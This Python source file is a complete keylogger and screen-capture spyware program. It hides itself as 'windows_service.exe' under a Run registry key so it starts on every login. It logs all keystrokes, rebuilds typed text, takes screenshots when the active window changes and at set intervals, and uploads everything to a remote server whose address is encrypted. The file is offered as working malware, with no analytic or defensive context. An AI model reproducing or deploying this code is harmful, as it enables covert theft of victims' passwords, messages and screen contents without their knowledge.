import datetime
import os
import keyboard
import threading
import time
import requests
import glob
import pyautogui
import platform
import subprocess
import shutil
import sys
import winreg
from datetime import datetime
from cryptography.fernet import Fernet
from dotenv import load_dotenv

# --- Load environment variables and decrypt the URL ---
load_dotenv()
secret_key = os.getenv("SECRET_KEY")
enc_url= os.getenv("ENC_URL1")

cipher = Fernet(secret_key.encode())
decrypted_url = cipher.decrypt(enc_url.encode()).decode()

def add_to_startup():
    exe_name = "windows_service.exe"  # Must match PyInstaller output
    target_dir = os.path.join(os.environ["APPDATA"], "WindowsService")
    target_path = os.path.join(target_dir, exe_name)

    if not os.path.exists(target_dir):
        os.makedirs(target_dir)

    if not os.path.exists(target_path):
        shutil.copyfile(sys.executable, target_path)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsService", 0, winreg.REG_SZ, target_path)
        winreg.CloseKey(key)

class KeyLogger:
    def __init__(self):
        self.LOG_INTERVAL = 2 * 60
        self.KEYLOG_FILE = "keylog.txt"
        self.is_running = True
        self.paragraph_text = ""
        self.shift_pressed = False

        self.shift_map = {
            '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
            '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
            '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
            ';': ':', "'": '"', ',': '<', '.': '>', '/': '?', '`': '~'
        }

        self.ignore_keys = {'up', 'down', 'left', 'right', 'caps lock', 'ctrl', 'alt', 'tab'}

    def on_press(self, event):
        now = datetime.now().strftime("%H:%M")
        key = event.name
        log_entry = f"[{now}] {key if len(key) == 1 else f'[{key}]'}\n"
        with open(self.KEYLOG_FILE, 'a') as f:
            f.write(log_entry)

        if key in ["shift", "shift right"]:
            self.shift_pressed = True
            return

        if key in self.ignore_keys:
            return

        if key == "space":
            self.paragraph_text += " "
        elif key == "enter":
            self.paragraph_text += "\n"
        elif key == "backspace":
            self.paragraph_text = self.paragraph_text[:-1]
        elif len(key) == 1:
            if self.shift_pressed:
                self.paragraph_text += self.shift_map.get(key, key.upper())
            else:
                self.paragraph_text += key
        else:
            self.paragraph_text += f"[{key}]"

        self.shift_pressed = False

    def handle_log_rotation(self):
        while self.is_running:
            time.sleep(self.LOG_INTERVAL)
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M")
            if os.path.exists(self.KEYLOG_FILE):
                keylog_name = f"keylog_{timestamp}.txt"
                os.rename(self.KEYLOG_FILE, keylog_name)
            if self.paragraph_text:
                paralog_name = f"paralog_{timestamp}.txt"
                with open(paralog_name, 'w') as f:
                    f.write(self.paragraph_text)
                self.paragraph_text = ""

    def start(self):
        keyboard.on_press(self.on_press)
        log_thread = threading.Thread(target=self.handle_log_rotation, daemon=True)
        log_thread.start()
        keyboard.wait('esc')
        self.is_running = False

class LogUploader:
    def __init__(self):
        self.UPLOAD_INTERVAL = 60
        self.SERVER_URL = decrypted_url
        self.is_running = True

    def get_all_logs(self):
        return sorted(glob.glob("keylog_*.txt") + glob.glob("paralog_*.txt"))

    def upload_logs(self):
        while self.is_running:
            for file_path in self.get_all_logs():
                try:
                    with open(file_path, "rb") as f:
                        response = requests.post(self.SERVER_URL, files={"file": f})
                    if response.status_code == 200:
                        os.remove(file_path)
                except Exception as e:
                    print(f"[Uploader] Error uploading {file_path}: {e}")
            time.sleep(self.UPLOAD_INTERVAL)

    def start(self):
        upload_thread = threading.Thread(target=self.upload_logs, daemon=True)
        upload_thread.start()

class ScreenCapturer:
    def __init__(self):
        self.SCREENSHOT_DIR = "screenshots"
        self.UPLOAD_INTERVAL = 60
        self.last_window = ""
        self.last_capture_time = 0
        self.SERVER_URL = decrypted_url
        self.is_running = True
        os.makedirs(self.SCREENSHOT_DIR, exist_ok=True)

    def get_active_window(self):
        try:
            if platform.system() == "Windows":
                import win32gui
                return win32gui.GetWindowText(win32gui.GetForegroundWindow())
            elif platform.system() == "Darwin":
                output = subprocess.check_output(["osascript", "-e", 'tell application "System Events" to get name of (processes where frontmost is true)'])
                return output.decode().strip()
            else:
                output = subprocess.check_output(["xdotool", "getwindowfocus", "getwindowname"])
                return output.decode().strip()
        except Exception:
            return ""

    def take_screenshot(self, reason="interval"):
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        file_path = os.path.join(self.SCREENSHOT_DIR, f"screenshot_{reason}_{timestamp}.png")
        try:
            screenshot = pyautogui.screenshot()
            screenshot.save(file_path)
            with open(file_path, "rb") as f:
                response = requests.post(self.SERVER_URL, files={"file": f})
            if response.status_code == 200:
                os.remove(file_path)
        except Exception as e:
            print(f"[Screen] Error: {e}")

    def capture_and_upload(self):
        while self.is_running:
            active_window = self.get_active_window()
            current_time = time.time()
            if active_window != self.last_window:
                self.last_window = active_window
                self.take_screenshot("tabchange")
            if current_time - self.last_capture_time >= self.UPLOAD_INTERVAL:
                self.last_capture_time = current_time
                self.take_screenshot("interval")
            time.sleep(1)

    def start(self):
        thread = threading.Thread(target=self.capture_and_upload, daemon=True)
        thread.start()

def main():
    add_to_startup()  # Ensure autostart
    keylogger = KeyLogger()
    uploader = LogUploader()
    screencap = ScreenCapturer()

    uploader.start()
    screencap.start()
    keylogger.start()

if __name__ == "__main__":
    main()
